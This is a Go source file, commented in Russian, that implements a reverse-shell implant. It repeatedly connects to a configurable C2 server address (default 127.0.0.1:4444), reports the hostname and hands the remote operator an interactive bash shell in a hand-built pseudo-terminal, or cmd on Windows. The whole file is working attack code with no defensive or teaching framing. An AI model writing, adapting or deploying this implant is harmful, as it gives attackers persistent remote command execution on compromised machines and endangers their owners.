package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

var (
	serverAddr = flag.String("server", "127.0.0.1:4444", "адрес C2 сервера (IP:PORT)")
)
const TIOCGRANTPT = 0x40045430 // Обычно это значение

func main() {
	flag.Parse()
	for {
		conn, err := net.Dial("tcp", *serverAddr)
		if err != nil {
			fmt.Println("[!] Не удалось подключиться к C2, повтор через 10 сек:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		fmt.Println("[+] Подключение к C2 установлено")
		handleConnection(conn)
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func handleConnection(conn net.Conn) {
	hostname, _ := os.Hostname()
	_, err := conn.Write([]byte(hostname + "\n"))
	if err != nil {
		fmt.Println("[-] Ошибка отправки приветствия:", err)
		return
	}
	interactiveShell(conn)
}

// interactiveShell запускает шелл в псевдотерминале (PTY)
func interactiveShell(conn net.Conn) {
	// Определяем команду для запуска
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// На Windows PTY не поддерживается нативно, используем обычный cmd
		cmd = exec.Command("cmd")
		runWindowsShell(conn, cmd)
		return
	} else {
		cmd = exec.Command("bash")
	}

	// Создаём PTY для Linux/macOS
	f, err := createPTY(cmd)
	if err != nil {
		fmt.Println("[-] Ошибка создания PTY:", err)
		return
	}
	defer f.Close()

	// Запускаем процесс
	err = cmd.Start()
	if err != nil {
		fmt.Println("[-] Ошибка запуска шелла:", err)
		return
	}

	// Отключаем таймаут
	conn.SetReadDeadline(time.Time{})

	// Горутина: сокет -> PTY
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if _, writeErr := f.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	// Горутина: PTY -> сокет
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := f.Read(buf)
			if n > 0 {
				if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	// Ждём завершения процесса
	err = cmd.Wait()
	if err != nil {
		fmt.Println("[*] Шелл завершился с ошибкой:", err)
	} else {
		fmt.Println("[*] Шелл завершился")
	}

	// Восстанавливаем таймаут
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}

// createPTY создаёт псевдотерминал для Linux/macOS
func createPTY(cmd *exec.Cmd) (*os.File, error) {
    // 1. Открываем master
    f, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
    if err != nil {
        return nil, fmt.Errorf("не удалось открыть /dev/ptmx: %v", err)
    }

    // 2. Получаем номер slave через TIOCGPTN
    var num int
    _, _, errno := syscall.Syscall(
        syscall.SYS_IOCTL,
        f.Fd(),
        syscall.TIOCGPTN,
        uintptr(unsafe.Pointer(&num)),
    )
    if errno != 0 {
        f.Close()
        return nil, fmt.Errorf("ошибка TIOCGPTN: %v", errno)
    }

    // 3. Разблокируем slave
    var unlock int = 0
    _, _, errno = syscall.Syscall(
        syscall.SYS_IOCTL,
        f.Fd(),
        syscall.TIOCSPTLCK,
        uintptr(unsafe.Pointer(&unlock)),
    )
    if errno != 0 {
        f.Close()
        return nil, fmt.Errorf("ошибка разблокировки PTY: %v", errno)
    }

    // 4. Открываем slave
    slaveName := fmt.Sprintf("/dev/pts/%d", num)
    slave, err := os.OpenFile(slaveName, os.O_RDWR, 0)
    if err != nil {
        f.Close()
        return nil, fmt.Errorf("не удалось открыть %s: %v", slaveName, err)
    }

    // 5. Настраиваем raw-режим
    err = setRawTerminal(slave.Fd())
    if err != nil {
        f.Close()
        slave.Close()
        return nil, fmt.Errorf("ошибка настройки терминала: %v", err)
    }

    // 6. Подключаем stdin/stdout/stderr к slave
    cmd.Stdin = slave
    cmd.Stdout = slave
    cmd.Stderr = slave

    // 7. Настраиваем SysProcAttr
    // ВАЖНО: Ctty должен быть 0 (stdin), а не дескриптор slave!
    // Убеждаемся, что дескриптор не будет закрыт до exec
    cmd.SysProcAttr = &syscall.SysProcAttr{
        Setsid: true,
        Setctty: true,
        Ctty: 0, // Используем stdin (0)
    }

    return f, nil
}

// setRawTerminal переводит терминал в raw-режим (отключает эхо, обработку сигналов и т.д.)
func setRawTerminal(fd uintptr) error {
	// Получаем текущие атрибуты терминала
	var termios syscall.Termios
	_, _, errno := syscall.Syscall6(
		syscall.SYS_IOCTL,
		fd,
		syscall.TCGETS, // 0x5401
		uintptr(unsafe.Pointer(&termios)),
		0, 0, 0,
	)
	if errno != 0 {
		return fmt.Errorf("ошибка TCGETS: %v", errno)
	}

	// Изменяем атрибуты: отключаем эхо, канонический режим, обработку сигналов
	termios.Lflag &^= syscall.ECHO | syscall.ICANON | syscall.ISIG
	termios.Iflag &^= syscall.IXON | syscall.ICRNL
	termios.Oflag &^= syscall.OPOST
	termios.Cflag |= syscall.CS8

	// Устанавливаем обновлённые атрибуты
	_, _, errno = syscall.Syscall6(
		syscall.SYS_IOCTL,
		fd,
		syscall.TCSETS, // 0x5402
		uintptr(unsafe.Pointer(&termios)),
		0, 0, 0,
	)
	if errno != 0 {
		return fmt.Errorf("ошибка TCSETS: %v", errno)
	}

	return nil
}

// runWindowsShell для Windows (без PTY, через pipes)
func runWindowsShell(conn net.Conn, cmd *exec.Cmd) {
	stdin, err := cmd.StdinPipe()
	if err != nil {
		fmt.Println("[-] Ошибка создания stdin pipe:", err)
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println("[-] Ошибка создания stdout pipe:", err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		fmt.Println("[-] Ошибка создания stderr pipe:", err)
		return
	}

	err = cmd.Start()
	if err != nil {
		fmt.Println("[-] Ошибка запуска шелла:", err)
		return
	}

	conn.SetReadDeadline(time.Time{})

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if _, writeErr := stdin.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := stdout.Read(buf)
			if n > 0 {
				if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := stderr.Read(buf)
			if n > 0 {
				if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	err = cmd.Wait()
	if err != nil {
		fmt.Println("[*] Шелл завершился с ошибкой:", err)
	} else {
		fmt.Println("[*] Шелл завершился")
	}
}
